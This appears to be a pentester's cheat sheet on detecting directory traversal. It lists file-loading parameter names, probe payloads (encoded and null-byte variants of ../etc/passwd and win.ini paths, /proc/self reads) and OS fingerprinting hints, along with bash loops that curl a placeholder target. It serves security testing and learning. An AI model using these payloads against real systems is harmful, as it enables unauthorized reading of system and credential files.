---
aliases:
  - Path Traversal Detection
  - Directory Traversal Recon
tags:
  - vuln/path-traversal
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Directory Traversal]]"
---
# Directory Traversal - Detección y Reconocimiento

***

## Identificar Endpoints con File Params

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?file=` | Direct file param | Generic file load. |
| `?path=` | Path param | Same. |
| `?filename=` | Filename | Common. |
| `?page=` | Sometimes file include | Templates. |
| `?include=` / `?inc=` | PHP include style | Direct LFI. |
| `?template=` / `?tmpl=` | Template loader | Path-driven. |
| `?view=` | View file | MVC apps. |
| `?doc=` / `?document=` | Document download | DocLoader. |
| `?img=` / `?image=` / `?photo=` | Image proxy | Image loader. |
| `?download=` | Download endpoint | Direct. |
| `?attachment=` | Attachment | Same. |
| `?lang=` / `?locale=` | Language file load | i18n. |
| `?theme=` / `?skin=` | Theme files | CMS. |
| `?content=` | Content load | Dynamic. |
| `?nav=` / `?navigation=` | Nav load | Multi-page. |
| `?action=` | Action handler | RPC-style. |
| `?type=` | Type-based load | Polymorphic. |
| `?module=` / `?mod=` | Module loader | Plugin. |
| `?show=` / `?display=` | View controller | Display. |
| Body field `file` | POST body | Same vector. |
| Path segment | `/file/X.txt` | RESTful. |
| Headers `X-Path:` | Custom header | Edge case. |
^pt-detect-params

___

## Probes Iniciales

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Unix traversal | `../etc/passwd` | Returns `/etc/passwd` content. |
| Windows traversal | `..\\windows\\win.ini` | Returns Windows ini. |
| Multi-level | `../../../etc/passwd` | Climb directories. |
| Absolute path | `/etc/passwd` | Direct path (no traversal). |
| With `file://` scheme | `file:///etc/passwd` | URL-style. |
| Null byte truncation | `../etc/passwd%00` | Bypass extension append. |
| URL-encoded slash | `..%2Fetc%2Fpasswd` | Encoded separator. |
| Doble URL-encoded | `..%252Fetc%252Fpasswd` | Multi-decode. |
| Backslash | `..\\etc\\passwd` | Windows-style. |
| Mixed slash | `../etc\\passwd` | Mixed. |
| Force include of own file | `../uploads/test.txt` (atacante uploaded) | Prove read works. |
| Length-based diff | Short path → 200, long path → 404 | Status diff. |
| Error-based | `../../../FAKEFILE` triggers error | Reveals file system structure. |
| Time-based | Slow read → exists, fast deny → not exists | Timing oracle. |
^pt-detect-probes

### Probe rápido bash

```bash
# Tests sequential
for p in '../etc/passwd' '../../etc/passwd' '../../../etc/passwd' \
         '..\\..\\..\\windows\\win.ini' '/etc/passwd' \
         'file:///etc/passwd' '..%2fetc%2fpasswd' '..%252fetc%252fpasswd'; do
  ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
  echo "=== $p ==="
  curl -s "https://target/api/file?path=$ENCODED" | head -c 300
  echo
done
```

___

## Detectar OS y Stack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Server: Apache` + `.php` | Linux + PHP típico | LAMP stack. |
| `Server: nginx` | Linux frequent | LEMP / nginx + PHP-FPM. |
| `X-Powered-By: PHP/x.y.z` | PHP backend | Direct. |
| `Server: Microsoft-IIS` | Windows + IIS | ASP / .NET. |
| `X-Powered-By: ASP.NET` | .NET stack | Windows. |
| `Server: Tomcat` / `Server: Jetty` | Java | Linux/Windows. |
| `Server: Werkzeug` | Python Flask dev | Python. |
| `Server: gunicorn` / `uvicorn` | Python prod | Same. |
| `X-Powered-By: Express` | Node.js | Common modern stack. |
| Cookie patterns | `PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `connect.sid` | Stack hint. |
| File extensions | `.php`, `.aspx`, `.jsp`, `.py`, `.rb`, `.go` | Direct. |
| Error messages | "Cannot find file" patterns | Per-stack. |
| Path separators | If app accepts `/` or `\\` | OS-dependent. |
| Environment leak | `/proc/self/environ` reveals OS + stack | Linux specific. |
| Headers leak | Responses include implementation hints | Verbose mode. |
^pt-detect-os

### Probe OS rápido

```bash
# Linux specific
curl 'https://target/api/file?path=../../../etc/passwd'
# Should return root:x:0:...

# Windows specific
curl 'https://target/api/file?path=../../../windows/win.ini'
# Should return [fonts] etc.

# /proc trick (Linux only)
curl 'https://target/api/file?path=../../../proc/self/cmdline'
# Returns process command line
```

***
